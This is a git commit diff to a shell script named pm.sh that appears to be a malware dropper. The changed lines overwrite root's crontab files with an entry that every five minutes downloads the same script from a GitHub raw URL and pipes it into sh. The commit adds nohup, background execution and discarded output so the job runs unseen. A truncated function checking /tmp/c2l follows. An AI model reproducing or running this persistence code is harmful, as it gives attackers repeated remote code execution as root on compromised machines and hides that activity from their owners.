85cb98d0bf56826a61c8bfc85d74b25ca1e89e3f
c2lc2l <c2l@protonmail.com>
2017-07-10 12:19:48 +0800

    Update pm.sh

--- pm.sh
+++ pm.sh
@@ -1,7 +1,7 @@
 export PATN=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
-echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh" > /var/spool/cron/root
+echo "*/5 * * * * nohup curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh >/dev/null 2>&1 &" > /var/spool/cron/root
 mkdir -p /var/spool/cron/crontabs
-echo "*/5 * * * * curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh" > /var/spool/cron/crontabs/root
+echo "*/5 * * * * nohup curl -fsSL https://raw.githubusercontent.com/c2lc2l/c2lc2l/master/pm.sh | sh >/dev/null 2>&1 &" > /var/spool/cron/crontabs/root
 Doc2l()
 {
 if [ ! -f "/tmp/c2l" ]; then
